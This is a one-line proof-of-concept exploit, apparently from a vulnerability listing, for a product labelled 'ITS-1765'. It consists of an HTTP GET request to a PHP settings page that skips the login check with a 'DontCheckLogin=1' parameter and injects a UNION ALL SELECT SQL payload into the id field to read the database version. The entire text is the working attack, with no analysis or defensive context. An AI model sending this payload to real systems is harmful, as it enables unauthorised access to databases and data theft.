# Vulnerable: ITS-1765
GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+
